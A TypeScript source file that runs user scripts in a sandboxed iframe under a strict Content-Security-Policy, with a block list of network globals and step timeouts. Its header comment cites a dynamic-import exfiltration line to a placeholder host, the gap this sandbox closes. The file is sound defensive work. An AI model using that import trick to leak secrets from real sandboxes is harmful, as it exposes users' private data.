import type { SandboxEntity, StepResponse } from "./scriptSandbox.worker";

/**
 * Runs project scripts inside a CSP-locked, opaque-origin iframe.
 *
 * The Worker sandbox removed network globals by deleting them, which stops
 * `fetch` and friends but cannot touch dynamic `import()` — that is syntax,
 * not a property, so `import("http://host/?" + secret)` stayed open as a GET
 * exfiltration channel.
 *
 * An iframe can carry what a Worker cannot: a Content-Security-Policy. With
 * `connect-src 'none'` there is no fetch/XHR/WebSocket/beacon, and because
 * `script-src` permits only inline script, `import()` of any URL is refused by
 * the policy rather than by property hygiene.
 *
 * `sandbox="allow-scripts"` **without** `allow-same-origin` also puts the
 * frame on an opaque origin, so even a policy bypass would not be same-origin
 * with the `/rpc` proxy.
 *
 * Scripts still see plain `{x, y, z}` vectors and return a transform patch;
 * nothing live crosses the boundary.
 */

const CSP = [
  "default-src 'none'",
  // 'unsafe-eval' is required: user scripts are compiled with new Function.
  // 'unsafe-inline' covers the harness below. No URL source is permitted, so
  // import() and importScripts() have nothing they are allowed to load.
  "script-src 'unsafe-inline' 'unsafe-eval'",
  "connect-src 'none'",
  "img-src 'none'",
  "style-src 'none'",
  "frame-src 'none'",
  "object-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
].join("; ");

/** The harness that runs inside the frame. Kept small and dependency-free. */
const HARNESS = String.raw`
// Defence in depth. The CSP already refuses the requests, but removing the
// capabilities means a script cannot even begin one, and it keeps the
// isolation assertions identical across the frame and worker transports.
const reply = parent.postMessage.bind(parent);
(function harden(){
  var blocked = ["fetch","XMLHttpRequest","WebSocket","EventSource","Request","Response",
                 "indexedDB","caches","Worker","SharedWorker","BroadcastChannel","navigator",
                 "postMessage","importScripts","open","parent","top","frameElement"];
  var target = window;
  while (target && target !== Object.prototype) {
    for (var i = 0; i < blocked.length; i++) {
      var name = blocked[i];
      if (!Object.prototype.hasOwnProperty.call(target, name)) continue;
      try { delete target[name]; } catch (e) {}
      try { Object.defineProperty(target, name, { value: undefined, configurable: false, writable: false }); } catch (e) {}
    }
    target = Object.getPrototypeOf(target);
  }
})();

const compiled = new Map();
function compile(id, code) {
  const cached = compiled.get(id);
  if (cached && cached.code === code) return cached.fn;
  const fn = new Function(
    "entity", "state", "delta",
    '"use strict";\n' + code + '\nreturn typeof update === "function" ? update(entity, state, delta) : state;'
  );
  compiled.set(id, { code, fn });
  return fn;
}
window.addEventListener("message", (event) => {
  const request = event.data;
  if (!request || request.type !== "step") return;
  const logs = [];
  const names = request.entities.map((e) => e.name);
  for (const entity of request.entities) {
    for (const scriptId of entity.scriptIds) {
      const script = request.scripts.find((s) => s.id === scriptId);
      if (!script) continue;
      try {
        compile(script.id, script.code)(entity, { time: request.time, entities: names }, request.delta);
      } catch (error) {
        logs.push("script " + script.name + ": " + String(error));
      }
    }
  }
  reply({
    type: "step",
    seq: request.seq,
    patches: request.entities.map((e) => ({ id: e.id, position: e.position, rotation: e.rotation, scale: e.scale })),
    logs,
  }, "*");
});
reply({ type: "ready" }, "*");
`;

const SRCDOC = `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${CSP}"></head><body><script>${HARNESS}<\/script></body></html>`;

const STEP_TIMEOUT_MS = 2000;
const READY_TIMEOUT_MS = 5000;

export interface FrameStepRequest {
  delta: number;
  time: number;
  entities: SandboxEntity[];
  scripts: Array<{ id: string; name: string; code: string }>;
}

export interface FrameStepOutcome {
  patches: StepResponse["patches"];
  logs: string[];
}

export class FrameSandbox {
  private frame: HTMLIFrameElement | null = null;
  private ready: Promise<void>;
  private seq = 0;
  private pending = new Map<number, { resolve: (value: FrameStepOutcome) => void; timer: number }>();
  private onMessage: (event: MessageEvent) => void;

  constructor() {
    this.onMessage = (event: MessageEvent) => {
      if (!this.frame || event.source !== this.frame.contentWindow) return;
      const data = event.data as StepResponse | { type: "ready" };
      if (data?.type !== "step") return;
      const entry = this.pending.get(data.seq);
      if (!entry) return;
      this.pending.delete(data.seq);
      window.clearTimeout(entry.timer);
      entry.resolve({ patches: data.patches, logs: data.logs });
    };
    window.addEventListener("message", this.onMessage);
    this.ready = this.mount();
  }

  private mount(): Promise<void> {
    const frame = document.createElement("iframe");
    // No allow-same-origin: the frame runs on an opaque origin.
    frame.setAttribute("sandbox", "allow-scripts");
    frame.setAttribute("aria-hidden", "true");
    frame.style.cssText = "position:absolute;width:0;height:0;border:0;visibility:hidden";
    frame.srcdoc = SRCDOC;
    this.frame = frame;

    return new Promise<void>((resolve, reject) => {
      const timer = window.setTimeout(() => reject(new Error("script sandbox did not start")), READY_TIMEOUT_MS);
      const onReady = (event: MessageEvent) => {
        if (event.source !== frame.contentWindow) return;
        if ((event.data as { type?: string })?.type !== "ready") return;
        window.clearTimeout(timer);
        window.removeEventListener("message", onReady);
        resolve();
      };
      window.addEventListener("message", onReady);
      document.body.appendChild(frame);
    });
  }

  async step(request: FrameStepRequest): Promise<FrameStepOutcome> {
    await this.ready;
    const seq = ++this.seq;
    return new Promise<FrameStepOutcome>((resolve) => {
      // A script that never returns blocks the frame's event loop, not ours.
      // Replacing the frame is the only way to stop it.
      const timer = window.setTimeout(() => {
        this.pending.delete(seq);
        void this.restart();
        resolve({ patches: [], logs: [`scripts exceeded ${STEP_TIMEOUT_MS}ms and were terminated`] });
      }, STEP_TIMEOUT_MS);

      this.pending.set(seq, { resolve, timer });
      this.frame?.contentWindow?.postMessage({ type: "step", seq, ...request }, "*");
    });
  }

  private async restart(): Promise<void> {
    for (const entry of this.pending.values()) {
      window.clearTimeout(entry.timer);
      entry.resolve({ patches: [], logs: ["sandbox restarted"] });
    }
    this.pending.clear();
    this.frame?.remove();
    this.ready = this.mount();
    await this.ready.catch(() => undefined);
  }

  dispose(): void {
    for (const entry of this.pending.values()) window.clearTimeout(entry.timer);
    this.pending.clear();
    window.removeEventListener("message", this.onMessage);
    this.frame?.remove();
    this.frame = null;
  }
}

/** True when this document can host a sandboxed iframe. */
export function canUseFrameSandbox(): boolean {
  return typeof document !== "undefined" && typeof document.createElement === "function" && Boolean(document.body);
}
